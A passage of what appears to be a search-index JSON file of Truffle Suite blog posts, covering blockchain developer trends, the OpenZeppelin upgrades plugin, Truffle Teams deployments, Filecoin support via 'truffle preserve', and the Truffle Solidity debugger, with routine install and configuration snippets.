we\u2019ve missed or should know about, we\u2019d love to hear from you (or speak in person at TruffleCon 2019 ). #1 Development tooling release velocity is on fire \u00b6 Obviously we\u2019re a little biased, but in this case, we\u2019re talking about tools and utilities that are not chocolate-themed . It\u2019s literally every day we collectively come across something new that makes our lives as developers (or users, auditors, admins, etc) easier. This is a big deal for the long-term success of the wider ecosystem because happy and productive developers obviously strongly correlates with increased experimentation, the volume of shipped products and services, and expedites the process of on-boarding new people (developers or otherwise) into the blockchain space. At Truffle, we\u2019re also pushing harder than ever to make the DX as sweet as possible. Like, raspberry truffle sweet. This includes new features and enhancements to the existing suite (such as integration with Hyperledger Fabric's chaincode EVM ), as well as the upcoming Truffle DB and Truffle Teams . #2 Managed Blockchain Services are here \u00b6 Managed Blockchain Services (MBS) are evolving rapidly. In the first half of 2019 alone we\u2019ve seen the launch of new services from heavyweights such as Microsoft and Amazon , and players such as Kaleido evolving their stack with dizzying speed. These services, of course, do all the heavy lifting when it comes to spinning up private or consortium networks, something that was historically cumbersome from a DevOps perspective. Excitingly, the maturation of these services is coinciding with an increased understanding of the use-cases for permissioned ledgers and accordingly, we\u2019re seeing major projects and initiatives begin to roll out. The managed nature of these services has allowed the teams behind them to really focus on streamlining the developer experience Which leads us to the next trend... #3 We\u2019re seeing glimpses of the DX of the future \u00b6 In the words of William Gibson: \u201cThe future is already here - it's just not very evenly distributed\u201d and with the blockchain DX it\u2019s no different. Our favorite example of a DX from the future is Kaleido\u2019s Marketplace where within a few clicks you can add a token swap service , store data on IPFS , or pin a state proof to a public network. It\u2019s almost too easy. Seriously though, this evolution of developer experiences paves the way for how \u201cdelightful\u201d things might one-day be when building equivalent services for public networks. #4 Major corporations are pushing some seriously awesome open-source software \u00b6 While veteran projects like OpenZeppelin continue to blossom, one interesting trend we\u2019ve seen is larger organizations\u2019 increasing embrace of open-source with the recent release of some exciting new projects. Some great examples of this include Ernst & Young\u2019s Nightfall , Samsung\u2019s Blockchain SDK , Microsoft\u2019s Confidential Consortium Framework , and the continued evolution of the JPMorgan-backed Quorum . We\u2019re equally pumped by the launch of Cloudflare\u2019s Ethereum gateway too! It\u2019s exciting to see companies of all shapes and sizes embracing the paradigm in ways that we can all benefit. #5 Industries are becoming increasingly programmable, led by DeFi \u00b6 While companies like Stripe have turned programming against \u201ccentralized\u201d finance into an art form, they are inherently bound by the rules and regulations imposed by the industry itself. Decentralized Finance (or DeFi) on the other hand has no such intrinsic limitations. Want to open a Collateralized Debt Position? MakerDAO has a JavaScript library for that. DeFi is only limited by the imagination (and programming ability) of individual developers. We\u2019re rapidly seeing the decentralized equivalent of swaths of traditional financial services emerge, all of which are open and programmable in ways that the existing industry can only dream of. And of course it goes far beyond finance. Everything from supply chains to in-game assets are steadily turning Ethereum into the \u201c global platform for every asset \u201d. It\u2019s never been a better time to building on Ethereum. From tooling to infrastructure to a world-class open-source ecosystem, the developer-experience continues to blossom.", "title": "5 Trends Impacting the Blockchain Developer Experience"}, {"location": "blog/5-trends-impacting-the-blockchain-developer-experience/#1-development-tooling-release-velocity-is-on-fire", "text": "Obviously we\u2019re a little biased, but in this case, we\u2019re talking about tools and utilities that are not chocolate-themed . It\u2019s literally every day we collectively come across something new that makes our lives as developers (or users, auditors, admins, etc) easier. This is a big deal for the long-term success of the wider ecosystem because happy and productive developers obviously strongly correlates with increased experimentation, the volume of shipped products and services, and expedites the process of on-boarding new people (developers or otherwise) into the blockchain space. At Truffle, we\u2019re also pushing harder than ever to make the DX as sweet as possible. Like, raspberry truffle sweet. This includes new features and enhancements to the existing suite (such as integration with Hyperledger Fabric's chaincode EVM ), as well as the upcoming Truffle DB and Truffle Teams .", "title": "#1 Development tooling release velocity is on fire"}, {"location": "blog/5-trends-impacting-the-blockchain-developer-experience/#2-managed-blockchain-services-are-here", "text": "Managed Blockchain Services (MBS) are evolving rapidly. In the first half of 2019 alone we\u2019ve seen the launch of new services from heavyweights such as Microsoft and Amazon , and players such as Kaleido evolving their stack with dizzying speed. These services, of course, do all the heavy lifting when it comes to spinning up private or consortium networks, something that was historically cumbersome from a DevOps perspective. Excitingly, the maturation of these services is coinciding with an increased understanding of the use-cases for permissioned ledgers and accordingly, we\u2019re seeing major projects and initiatives begin to roll out. The managed nature of these services has allowed the teams behind them to really focus on streamlining the developer experience Which leads us to the next trend...", "title": "#2 Managed Blockchain Services are here"}, {"location": "blog/5-trends-impacting-the-blockchain-developer-experience/#3-were-seeing-glimpses-of-the-dx-of-the-future", "text": "In the words of William Gibson: \u201cThe future is already here - it's just not very evenly distributed\u201d and with the blockchain DX it\u2019s no different. Our favorite example of a DX from the future is Kaleido\u2019s Marketplace where within a few clicks you can add a token swap service , store data on IPFS , or pin a state proof to a public network. It\u2019s almost too easy. Seriously though, this evolution of developer experiences paves the way for how \u201cdelightful\u201d things might one-day be when building equivalent services for public networks.", "title": "#3 We\u2019re seeing glimpses of the DX of the future"}, {"location": "blog/5-trends-impacting-the-blockchain-developer-experience/#4-major-corporations-are-pushing-some-seriously-awesome-open-source-software", "text": "While veteran projects like OpenZeppelin continue to blossom, one interesting trend we\u2019ve seen is larger organizations\u2019 increasing embrace of open-source with the recent release of some exciting new projects. Some great examples of this include Ernst & Young\u2019s Nightfall , Samsung\u2019s Blockchain SDK , Microsoft\u2019s Confidential Consortium Framework , and the continued evolution of the JPMorgan-backed Quorum . We\u2019re equally pumped by the launch of Cloudflare\u2019s Ethereum gateway too! It\u2019s exciting to see companies of all shapes and sizes embracing the paradigm in ways that we can all benefit.", "title": "#4 Major corporations are pushing some seriously awesome open-source software"}, {"location": "blog/5-trends-impacting-the-blockchain-developer-experience/#5-industries-are-becoming-increasingly-programmable-led-by-defi", "text": "While companies like Stripe have turned programming against \u201ccentralized\u201d finance into an art form, they are inherently bound by the rules and regulations imposed by the industry itself. Decentralized Finance (or DeFi) on the other hand has no such intrinsic limitations. Want to open a Collateralized Debt Position? MakerDAO has a JavaScript library for that. DeFi is only limited by the imagination (and programming ability) of individual developers. We\u2019re rapidly seeing the decentralized equivalent of swaths of traditional financial services emerge, all of which are open and programmable in ways that the existing industry can only dream of. And of course it goes far beyond finance. Everything from supply chains to in-game assets are steadily turning Ethereum into the \u201c global platform for every asset \u201d. It\u2019s never been a better time to building on Ethereum. From tooling to infrastructure to a world-class open-source ecosystem, the developer-experience continues to blossom.", "title": "#5 Industries are becoming increasingly programmable, led by DeFi"}, {"location": "blog/a-sweet-upgradeable-contract-experience-with-openzeppelin-and-truffle/", "text": "Immutability is a cornerstone of blockchain technology. This is great for many reasons, but presents a problem when it\u2019s time to upgrade our smart contracts. There are a few different upgrade patterns, but one that\u2019s proven to be robust is the proxy pattern. This pattern has, until now, involved some additional overhead for development teams. Thanks to OpenZeppelin though, you can now deploy upgradeable contract systems with ease using the familiar Truffle tool suite! The Proxy Pattern \u00b6 At a high level, the proxy upgrade pattern involves deploying a proxy contract that delegates function calls to your logic and storage contracts. The proxy is storing addresses of the logic contracts and these addresses can be changed. This allows you to deploy a new version of the logic contract and point the proxy to that new version. The proxy contract can point to any number of different logic contracts. There are many concerns around this pattern you\u2019ll need to keep in mind, such as making sure your old contracts cannot be used maliciously. For more information on proxy patterns, check out OpenZeppelin\u2019s proxy pattern guide . Using the Plugin \u00b6 First, install the package: npm install --save-dev @openzeppelin/truffle-upgrades Note : This package requires Truffle version 5.1.35 or greater. Then, in your migration script, use the new deployProxy and upgradeProxy functions: const { deployProxy , upgradeProxy } = require ( '@openzeppelin/truffle-upgrades' ); const Box = artifacts . require ( 'Box' ); const BoxV2 = artifacts . require ( 'BoxV2' ); module . exports = async function ( deployer ) { const instance = await deployProxy ( Box , [ 42 ], { deployer }); const upgraded = await upgradeProxy ( instance . address , BoxV2 , { deployer }); } Now your contract systems can be much more flexible while still leveraging all of the benefits of a blockchain network. For more information on the truffle-upgrades plugin, check out OpenZeppelin\u2019s Truffle documentation . We\u2019re very excited about this plugin and would love to hear more about how you\u2019re using it and how we can make the experience even better! Please let us know how you feel in the Truffler Slack community or on OpenZeppelin\u2019s forum !", "title": "A Sweet Upgradeable Contract Experience with OpenZeppelin and Truffle"}, {"location": "blog/a-sweet-upgradeable-contract-experience-with-openzeppelin-and-truffle/#the-proxy-pattern", "text": "At a high level, the proxy upgrade pattern involves deploying a proxy contract that delegates function calls to your logic and storage contracts. The proxy is storing addresses of the logic contracts and these addresses can be changed. This allows you to deploy a new version of the logic contract and point the proxy to that new version. The proxy contract can point to any number of different logic contracts. There are many concerns around this pattern you\u2019ll need to keep in mind, such as making sure your old contracts cannot be used maliciously. For more information on proxy patterns, check out OpenZeppelin\u2019s proxy pattern guide .", "title": "The Proxy Pattern"}, {"location": "blog/a-sweet-upgradeable-contract-experience-with-openzeppelin-and-truffle/#using-the-plugin", "text": "First, install the package: npm install --save-dev @openzeppelin/truffle-upgrades Note : This package requires Truffle version 5.1.35 or greater. Then, in your migration script, use the new deployProxy and upgradeProxy functions: const { deployProxy , upgradeProxy } = require ( '@openzeppelin/truffle-upgrades' ); const Box = artifacts . require ( 'Box' ); const BoxV2 = artifacts . require ( 'BoxV2' ); module . exports = async function ( deployer ) { const instance = await deployProxy ( Box , [ 42 ], { deployer }); const upgraded = await upgradeProxy ( instance . address , BoxV2 , { deployer }); } Now your contract systems can be much more flexible while still leveraging all of the benefits of a blockchain network. For more information on the truffle-upgrades plugin, check out OpenZeppelin\u2019s Truffle documentation . We\u2019re very excited about this plugin and would love to hear more about how you\u2019re using it and how we can make the experience even better! Please let us know how you feel in the Truffler Slack community or on OpenZeppelin\u2019s forum !", "title": "Using the Plugin"}, {"location": "blog/an-easier-way-to-deploy-your-smart-contracts/", "text": "TL;DR - Deploying your smart contracts shouldn't be difficult, and the process should be flexible. I give a sneak peek at the next feature we're building: an easy to use interface to deploy your Truffle projects with Truffle Teams ! It's going to be awesome, and you can be the first to use it ! I'll be giving a hands-on workshop from 9AM-12PM on Friday, August 2nd, at TruffleCon 2019 that will walk you through through the entire Truffle Teams lifecycle, including the never-before-used Deployments interface ! See you there! So! You've finished implementing your dApp, you've tested it on Ganache , and you're ready to push it to a testnet or Mainnet! Congratula\u2014oh wait. It's not that easy. There are a handful of solutions, and none have really made it painlessly easy. Even our own truffle migrate (aka truffle deploy ) has left much to be desired. Well it's about to get a whole lot easier with Truffle Teams. Skip to the good stuff. The Not-So-Easy Ways to Deploy Your Smart Contracts \u00b6 So what's wrong with what's already made? Why make yet another tool? I hear you. Let's take a look at what is available, and if you're still meh, I'd love to talk to you at TruffleCon ! Remix Oh Remix , we all have fond memories of you. And many people still use Remix for all sorts of use cases! Remix gives you an in-browser Ethereum IDE, letting you develop, compile, test, debug, and deploy smart contracts for Ethereum. And it's probably the least amount of work needed to throw a single smart contract onto a testnet or Mainnet (i.e. when deploying a single .sol file). Remix, as of version 0.7.7 , gives you a simple Deploy button. This will send a transaction to the web3 provider of your choice (many use MetaMask ), and you're off to the races! Great, right? Well, Remix gets harder to use as you add more contracts, import 3rd party contracts, work as a whole team, etc. It's definitely flexible and able to handle these use cases (though not without legwork and configuration), but it's not my personal preference for developing large, complex dApps. Truffle CLI Enter Truffle . It's a fantastic framework (not to toot our own horns) that lets you develop your dApp in a flexible and extensible way. It provides structure to keep you sane in this chaotic world of Web 3.0. It even gives you a mechanism to define what deploying (aka: \"migrating\") means for your application. You can specify what contracts get deployed in which order with whatever arguments you require. For instance, your smart contracts may depend on the deployment of a past contract, which you can easily code in migration scripts. And it's as easy as running truffle migrate ! ...and if you were deploying directly to Ganache , that'd be entirely true. But that's not the case when we start talking about testnets or Mainnet. The easiest way to deploy to an external network is by using Truffle's HD Wallet Provider . However, this requires you to somehow get your mnemonic or private key into the truffle-config.js config file, without committing it to your provider source control provider (PLEASE don't do this - you'll get your Ether stolen). To use an account you created with MetaMask, you'd need to export your private key from MetaMask (or your mnemonic, if you're feeling lucky \ud83d\ude31) and create the boilerplate code to read in the key from an environment variable (to prevent committing it to your repository and sharing it publicly). In all truthfulness, this isn't too bad, but it's also a bit too much config for me. I'd much rather use MetaMask directly to authenticate transactions during deployments. Custom Management Web Interface \u00b6 Some devs will create a small front-end web interface which uses web3.js to deploy their smart contracts. I have done this personally in my Game of Thrones Death Pool project, and I chalked it up to \"well I can put this on a website and others can deploy their own versions.\" Sometimes this is necessary, but it's more work if it's not absolutely needed for your application. My Version of an Ideal Deployment Interface \u00b6 In an ideal world, I'd like these features in a deployment interface: Lets me use MetaMask directly for signing transactions Remix \u2714\ufe0f | Truffle CLI \u274c | Custom Webapp \u2714\ufe0f A bonus win here is support for Ledger and Trezor wallets! I can use a framework/toolset/etc. that lets me build complex apps and supports complex deployment processes Remix \u274c | Truffle CLI \u2714\ufe0f | Custom Webapp \u2714\ufe0f I don't need to do a lot of work to go from finishing development to deploying Remix \u2714\ufe0f | Truffle CLI \u2714\ufe0f | Custom Webapp \u274c Introducing: Truffle Teams Deployments If you haven't heard about our latest tool, Truffle Teams , you really should check it out. Truffle Teams gives you zero-config Continuous Integration (CI) for your Truffle projects, and it also lets you monitor what's happening with your deployed contracts. Truffle Teams meshes the full Truffle Suite into a cohesive application that enables better collaboration within development teams (even teams of 1!). The next big feature we're working on is Deployments. We already compile your contracts from your Truffle project for you when you make a commit to GitHub; why can't we migrate/deploy them as well? Further, Truffle Teams is a web application, allowing for easy integration with MetaMask . We're looking at this from a DevOps perspective, and we're trying to create an extensible system that will support projects and teams of any size . Connect Your GitHub Repository to Truffle Teams \u00b6 To get started with Truffle Teams, you must first connect your GitHub repository. This is a simple step, and we have instructions on how to do this here . Setup Your Migrations Scripts \u00b6 If you haven't built a Truffle project, you should really give it a try; the Pet Shop Tutorial is a great place to start as it gives a good survey of the different facets of Truffle, including the migration scripts. These scripts let you define the behavior of deploying your smart contracts using a language you're already familiar with. In the tutorial, you deploy a single contract, but it has the flexibility to do so much more (i.e. you can deploy one contract, get its address, and use that in the constructor when deploying another contract). Setting up these scripts is part of the development lifecycle of creating a Truffle project, so I won't cover that here. But that's great! You should already be done with this step!! Commit to GitHub \u00b6 Welp. That was easy. \ud83d\ude05 Monitor the Status of Your Build \u00b6 Head over to https://my.truffleteams.com and click on the BUILDS tab if you're not there already. You can see a build has been queued or has started to process. You can click on the repository name in the card to see more details. You can also get to this page by clicking on the yellow dot in GitHub next to your commit and pressing Details . All Your Tests Pass, Let's Deploy! (but only to a testnet just to be sure) \u00b6 NOTE: This is just a sneak peek of features to come! You won't be able to follow along (yet, but stay tuned !). Great! Your builds are passing, and you're ready to deploy to a testnet (i.e. Ropsten) to see if everything works. Now head over to the DEPLOYMENTS tab and select your repository. You'll now see a screen that shows a list of builds for your commits on the left. Deploying a build is as simple as hovering over the commit, pressing a button, and selecting which network you'd like to deploy to. Truffle Teams will then start the migration/deployment process. Each transaction is sent to the web application and MetaMask will prompt you to confirm transactions. By leveraging MetaMask, we can give you Ledger and Trezor hardware wallet support too! \ud83d\udd12 Happy With a Released Version? Promote it to Production (aka deploy to Mainnet) \u00b6 But we're not done yet! You've finished your testing on Ropsten, and you're now ready to deploy to Mainnet. With the upcoming version of Teams, you can select that deployment and promote it to production (aka Mainnet) with just a couple of clicks. And that's it! Pretty easy if you ask me. \u00b6 \ud83c\udf89 Don't Believe Me? Be The First to Try it at My TruffleCon 2019 Workshop! \ud83c\udf89 \u00b6 I really hope you're going to TruffleCon; it's going to be awesome. Even more so because you can be the first to try Truffle Teams Deployments in my workshop! In my Push It! Push It Real Good: Truffle Teams Intro & Deployments (9AM-12PM on Friday, Aug, 2nd) workshop, we'll cover this entire lifecycle: hooking up your repository, getting your first build to pass, deploying to Ropsten, and finally monitoring transactions made against your contracts (we didn't talk about this here; check out the docs for more details on contract monitoring). Hopefully there will be time for me to answer any questions you have, and maybe even help get your own Truffle project hooked up with Truffle Teams! If not, I will be available during the office hours at 5PM on Friday! I'm also always happy to chat anytime throughout the conference!", "title": "An Easier Way to Deploy Your Smart Contracts"}, {"location": "blog/an-easier-way-to-deploy-your-smart-contracts/#the-not-so-easy-ways-to-deploy-your-smart-contracts", "text": "So what's wrong with what's already made? Why make yet another tool? I hear you. Let's take a look at what is available, and if you're still meh, I'd love to talk to you at TruffleCon !", "title": "The Not-So-Easy Ways to Deploy Your Smart Contracts"}, {"location": "blog/an-easier-way-to-deploy-your-smart-contracts/#custom-management-web-interface", "text": "Some devs will create a small front-end web interface which uses web3.js to deploy their smart contracts. I have done this personally in my Game of Thrones Death Pool project, and I chalked it up to \"well I can put this on a website and others can deploy their own versions.\" Sometimes this is necessary, but it's more work if it's not absolutely needed for your application.", "title": "Custom Management Web Interface"}, {"location": "blog/an-easier-way-to-deploy-your-smart-contracts/#my-version-of-an-ideal-deployment-interface", "text": "In an ideal world, I'd like these features in a deployment interface: Lets me use MetaMask directly for signing transactions Remix \u2714\ufe0f | Truffle CLI \u274c | Custom Webapp \u2714\ufe0f A bonus win here is support for Ledger and Trezor wallets! I can use a framework/toolset/etc. that lets me build complex apps and supports complex deployment processes Remix \u274c | Truffle CLI \u2714\ufe0f | Custom Webapp \u2714\ufe0f I don't need to do a lot of work to go from finishing development to deploying Remix \u2714\ufe0f | Truffle CLI \u2714\ufe0f | Custom Webapp \u274c", "title": "My Version of an Ideal Deployment Interface"}, {"location": "blog/an-easier-way-to-deploy-your-smart-contracts/#connect-your-github-repository-to-truffle-teams", "text": "To get started with Truffle Teams, you must first connect your GitHub repository. This is a simple step, and we have instructions on how to do this here .", "title": "Connect Your GitHub Repository to Truffle Teams"}, {"location": "blog/an-easier-way-to-deploy-your-smart-contracts/#setup-your-migrations-scripts", "text": "If you haven't built a Truffle project, you should really give it a try; the Pet Shop Tutorial is a great place to start as it gives a good survey of the different facets of Truffle, including the migration scripts. These scripts let you define the behavior of deploying your smart contracts using a language you're already familiar with. In the tutorial, you deploy a single contract, but it has the flexibility to do so much more (i.e. you can deploy one contract, get its address, and use that in the constructor when deploying another contract). Setting up these scripts is part of the development lifecycle of creating a Truffle project, so I won't cover that here. But that's great! You should already be done with this step!!", "title": "Setup Your Migrations Scripts"}, {"location": "blog/an-easier-way-to-deploy-your-smart-contracts/#commit-to-github", "text": "Welp. That was easy. \ud83d\ude05", "title": "Commit to GitHub"}, {"location": "blog/an-easier-way-to-deploy-your-smart-contracts/#monitor-the-status-of-your-build", "text": "Head over to https://my.truffleteams.com and click on the BUILDS tab if you're not there already. You can see a build has been queued or has started to process. You can click on the repository name in the card to see more details. You can also get to this page by clicking on the yellow dot in GitHub next to your commit and pressing Details .", "title": "Monitor the Status of Your Build"}, {"location": "blog/an-easier-way-to-deploy-your-smart-contracts/#all-your-tests-pass-lets-deploy-but-only-to-a-testnet-just-to-be-sure", "text": "NOTE: This is just a sneak peek of features to come! You won't be able to follow along (yet, but stay tuned !). Great! Your builds are passing, and you're ready to deploy to a testnet (i.e. Ropsten) to see if everything works. Now head over to the DEPLOYMENTS tab and select your repository. You'll now see a screen that shows a list of builds for your commits on the left. Deploying a build is as simple as hovering over the commit, pressing a button, and selecting which network you'd like to deploy to. Truffle Teams will then start the migration/deployment process. Each transaction is sent to the web application and MetaMask will prompt you to confirm transactions. By leveraging MetaMask, we can give you Ledger and Trezor hardware wallet support too! \ud83d\udd12", "title": "All Your Tests Pass, Let's Deploy! (but only to a testnet just to be sure)"}, {"location": "blog/an-easier-way-to-deploy-your-smart-contracts/#happy-with-a-released-version-promote-it-to-production-aka-deploy-to-mainnet", "text": "But we're not done yet! You've finished your testing on Ropsten, and you're now ready to deploy to Mainnet. With the upcoming version of Teams, you can select that deployment and promote it to production (aka Mainnet) with just a couple of clicks.", "title": "Happy With a Released Version? Promote it to Production (aka deploy to Mainnet)"}, {"location": "blog/an-easier-way-to-deploy-your-smart-contracts/#and-thats-it-pretty-easy-if-you-ask-me", "text": "", "title": "And that's it! Pretty easy if you ask me."}, {"location": "blog/an-easier-way-to-deploy-your-smart-contracts/#dont-believe-me-be-the-first-to-try-it-at-my-trufflecon-2019-workshop", "text": "I really hope you're going to TruffleCon; it's going to be awesome. Even more so because you can be the first to try Truffle Teams Deployments in my workshop! In my Push It! Push It Real Good: Truffle Teams Intro & Deployments (9AM-12PM on Friday, Aug, 2nd) workshop, we'll cover this entire lifecycle: hooking up your repository, getting your first build to pass, deploying to Ropsten, and finally monitoring transactions made against your contracts (we didn't talk about this here; check out the docs for more details on contract monitoring). Hopefully there will be time for me to answer any questions you have, and maybe even help get your own Truffle project hooked up with Truffle Teams! If not, I will be available during the office hours at 5PM on Friday! I'm also always happy to chat anytime throughout the conference!", "title": "\ud83c\udf89 Don't Believe Me? Be The First to Try it at My TruffleCon 2019 Workshop! \ud83c\udf89"}, {"location": "blog/announcing-collaboration-with-filecoin/", "text": "Today we're announcing an exciting new collaboration, aimed at helping developers across the globe create and deploy fully decentralized applications. We've teamed up with Filecoin to add support for the Filecoin network into our world class suite of tools. In typical Truffle fashion, we'll beef up the Truffle command line tool to give you everything you need to deploy directly to Filecoin; and then we'll add new features to Ganache so that you can easily simulate the Filecoin network during development and testing. The Decentralized Ideal \u00b6 Since Truffle's inception, we've long wanted to integrate with decentralized storage networks so we can help developers build fully decentralized applications. For the most part, this has been a waiting game: Decentralized storage networks have been in heavy development, and it's clear these technologies needed time to mature. With Filecoin's month-long hackathon starting this week , and the launch of their main network (\"mainnet\") coming later this summer, we thought now was the right time to give developers access to this amazing new technology. We're excited about Filecoin because it allows developers to build applications with 100% uptime. For instance, if an application uses only fully-dentralized technologies like Etheruem and Filecoin, the built-in incentivizations of those technologies will ensure miners around the world will keep that application running. With anti-censorship properties, as well as support for large amounts of data, Filecoin support could bring in a new age of Web3. There's a lot we have to do before we reach this ideal, but I'd love to tell you about our roadmap for the next six months. Truffle Preserve: Save Your App Data (available today!) \u00b6 In thinking about our support for Filecoin, the idea of preservation came quickly to mind. We envisioned that preserving application data like Javascript frontends and static assets would be a normal part of the deployment process. So we ran with that idea and added a new command to the Truffle command line tool: truffle preserve . Like preserving fruit, Truffle follows a \"recipe\" to preserve your files. In the gif above, Truffle is using the filecoin recipe, which will ship standard with our new version of Truffle. You can use truffle preserve today! You'll need to download a special release we created so you can start testing, shown below. Note that our Filecoin integration is very alpha, but we wanted to support all the amazing devs hacking on Filecoin this month during HackFS . $ npm install -g truffle@preserves To use truffle preserve , simply specify the files you want to preserve on the command line, and choose between the --filecoin or --ipfs recipes. The filecoin recipe uses the ipfs recipe under the hood. You can choose only the ipfs recipe if you have a different set up! // Preserve to Filecoin: $ truffle preserve . / path / to / directory -- filecoin // Preserve to IPFS only: $ truffle preserve . / path / to / directory -- ipfs By default, truffle preserve comes configured to work with the Powergate localnet , though you can change the IPFS and Filecoin connection information by adding the following to your truffle-config.js file: // ..., environments : { development : { \"ipfs\" : { address : \"http://localhost:5001\" }, \"filecoin\" : { address : \"ws://localhost:7777\" } } }, Note that this configuration adds a new top-level environments object. We'll be using this new configuration object as we upgrade to Truffle 6 in the future. Filecoin-flavored Ganache: Simulate Filecoin (Summer/Fall/Winter) \u00b6 Ganache was built as the sister application to Truffle, to speed up development and testing Ethereum applications. Now that we've added support to Truffle, it's only natural we provide the same highly-modular simulator for Filecoin. Over this summer and into Fall, we plan to create a Filecoin simulation library, as part of ganache-core . Then later on this Fall/Winter, we'll follow that up with support in our graphical version of Ganache, below! Get involved / Reach out! \u00b6 We're extremely excited to be working with the Filecoin team and adding support for Filecoin into Truffle's tooling. If you have questions about our Filecoin integration or our plan for the future, join our slack community and get your questions answered. Whether you're a new dev or a HackFS hacker , we're happy to help.", "title": "Announcing Collaboration with Filecoin - Big Integrations Coming"}, {"location": "blog/announcing-collaboration-with-filecoin/#the-decentralized-ideal", "text": "Since Truffle's inception, we've long wanted to integrate with decentralized storage networks so we can help developers build fully decentralized applications. For the most part, this has been a waiting game: Decentralized storage networks have been in heavy development, and it's clear these technologies needed time to mature. With Filecoin's month-long hackathon starting this week , and the launch of their main network (\"mainnet\") coming later this summer, we thought now was the right time to give developers access to this amazing new technology. We're excited about Filecoin because it allows developers to build applications with 100% uptime. For instance, if an application uses only fully-dentralized technologies like Etheruem and Filecoin, the built-in incentivizations of those technologies will ensure miners around the world will keep that application running. With anti-censorship properties, as well as support for large amounts of data, Filecoin support could bring in a new age of Web3. There's a lot we have to do before we reach this ideal, but I'd love to tell you about our roadmap for the next six months.", "title": "The Decentralized Ideal"}, {"location": "blog/announcing-collaboration-with-filecoin/#truffle-preserve-save-your-app-data-available-today", "text": "In thinking about our support for Filecoin, the idea of preservation came quickly to mind. We envisioned that preserving application data like Javascript frontends and static assets would be a normal part of the deployment process. So we ran with that idea and added a new command to the Truffle command line tool: truffle preserve . Like preserving fruit, Truffle follows a \"recipe\" to preserve your files. In the gif above, Truffle is using the filecoin recipe, which will ship standard with our new version of Truffle. You can use truffle preserve today! You'll need to download a special release we created so you can start testing, shown below. Note that our Filecoin integration is very alpha, but we wanted to support all the amazing devs hacking on Filecoin this month during HackFS . $ npm install -g truffle@preserves To use truffle preserve , simply specify the files you want to preserve on the command line, and choose between the --filecoin or --ipfs recipes. The filecoin recipe uses the ipfs recipe under the hood. You can choose only the ipfs recipe if you have a different set up! // Preserve to Filecoin: $ truffle preserve . / path / to / directory -- filecoin // Preserve to IPFS only: $ truffle preserve . / path / to / directory -- ipfs By default, truffle preserve comes configured to work with the Powergate localnet , though you can change the IPFS and Filecoin connection information by adding the following to your truffle-config.js file: // ..., environments : { development : { \"ipfs\" : { address : \"http://localhost:5001\" }, \"filecoin\" : { address : \"ws://localhost:7777\" } } }, Note that this configuration adds a new top-level environments object. We'll be using this new configuration object as we upgrade to Truffle 6 in the future.", "title": "Truffle Preserve: Save Your App Data (available today!)"}, {"location": "blog/announcing-collaboration-with-filecoin/#filecoin-flavored-ganache-simulate-filecoin-summerfallwinter", "text": "Ganache was built as the sister application to Truffle, to speed up development and testing Ethereum applications. Now that we've added support to Truffle, it's only natural we provide the same highly-modular simulator for Filecoin. Over this summer and into Fall, we plan to create a Filecoin simulation library, as part of ganache-core . Then later on this Fall/Winter, we'll follow that up with support in our graphical version of Ganache, below!", "title": "Filecoin-flavored Ganache: Simulate Filecoin (Summer/Fall/Winter)"}, {"location": "blog/announcing-collaboration-with-filecoin/#get-involved-reach-out", "text": "We're extremely excited to be working with the Filecoin team and adding support for Filecoin into Truffle's tooling. If you have questions about our Filecoin integration or our plan for the future, join our slack community and get your questions answered. Whether you're a new dev or a HackFS hacker , we're happy to help.", "title": "Get involved / Reach out!"}, {"location": "blog/announcing-full-portable-solidity-debugger/", "text": "Every one at Truffle is giddy right now. Since Truffle's inception, it's been our mission to build outstanding development tools for the Ethereum community. The analogy we always used was one of history: Ethereum development practices are years behind the rest of the industry, and it's our job to build tools that modernize our craft. Well today, Truffle's come one step closer to that goal. We're happy to announce the release of our fully featured, fully portable Solidity debugger and debugging libraries . What We've Built \u00b6 If you've followed Truffle development, you're familiar with the truffle debug command. This was the first incarnation of a \"debugger\" built into Truffle, though it wasn't much more than a code tracer. Our new debugger comes with everything you expect : Code stepping (over, into, out, next, instruction, etc.) Current code location, including the address of the running contract Breakpoints Watch expressions Variable inspection (stack, memory and storage) Custom expression evaluation using Solidity variables On top of that, our new debugger is fully portable, built to integrate with any Javascript project or editor, like Visual Studio Code. Lastly, we built it to work with any Ethereum client , so you could debug transactions against the main Ethereum network if you so desired. How it Works \u00b6 To debug your Solidity code, you first need to make a transaction. Ethereum is a world computer with a history of all execution, so we can pull all the information we need from past transactions. After obtaining the transaction hash, simply run the following to kick off your debugging experience: $ truffle debug <tx hash> This will open up the debugging console which you can use to your heart's content! The above user interface gives you access to the debugger features you need to step through your contracts' code, set breakpoints, evaluate expressions and inspect Solidity variables, providing you a better sense of what your code is doing. Under the hood, our debugger is interacting with your Ethereum client to gather all the data necessary to provide this information to you in a suitable manner. For developers reading this, the debugging library stores all this data in Redux, making the data easy to manage and making the library super portable. Most of the work done by the debugger results in some type of mapping. The debugger gathers tons of disparate data, like the bytecode of your contracts, abstract representations of your code, instructions run during your transaction, etc., and combines them to produce information useful to the contract developer. Perhaps the debugger's most valuable property is variable inspection: Using all the data gathered, the debugger can determine which variables exist within your contract, which apply to each section of the code, and what their values are at any point in time. It can even show the values of complex data types, like structs with nested arrays. We're still filling out a few data types, but expect those in the next couple weeks. If you plan on using the debug command today , we recommend using Using Truffle Develop and the Console . Truffle Develop comes with everything you need \"baked in\" to fully debug your contracts. Ganache and ganache-cli will need to be updated, so stay tuned for that in the coming days. Where to Next \u00b6 The debugger we built unlocks tons of value for all Ethereum developers both new and advanced, but what you're seeing here is the tip of the iceberg of where this technology will go. The interface above is just one interface, meant to show off the debugger's capability. As mentioned, the libraries we built are super portable, so they'll end up making their way into all of the following: Integrated Development Environments (IDEs) like Visual Studio Code Ganache , including a full debugging UI Drizzle , for automatic variable change detection after a transaction Browser plugins so you can debug transactions on the fly within your application Ethereum provider libraries that let you debug your code anywhere, without a plugin We encourage the Ethereum community to help build these tools. Our code is open source, and you can find all of it on Github . How to Get It \u00b6 If you already have Truffle installed, simply run the following to get you to the latest version: $ npm uninstall -g truffle $ npm install -g truffle If you're new to Truffle, you can try it out using: $ npm install -g truffle You may have to use sudo with the above commands if you're running Linux. More information about how to use Truffle can be found in our documentation , and feel free to reach out on our community GitHub Discussions channel , where hundreds of your fellow Trufflers congregate to answer your question. A Quick Thank You \u00b6 I'd like to personally thank the whole Truffle team for this effort, and particularly Nick D'Andrea for turning some initial research work into a fully portable, fully featured debugger. The engineering under the hood is amazing, I urge you to take a look . I'd also like to thank the community at large: It's a pleasure building the tools that make your lives easier, and your consistent feedback makes the whole endeavor worthwhile. Thanks, -- Tim", "title": "Announcing our Fully Featured, Portable Solidity Debugger"}, {"location": "blog/announcing-full-portable-solidity-debugger/#what-weve-built", 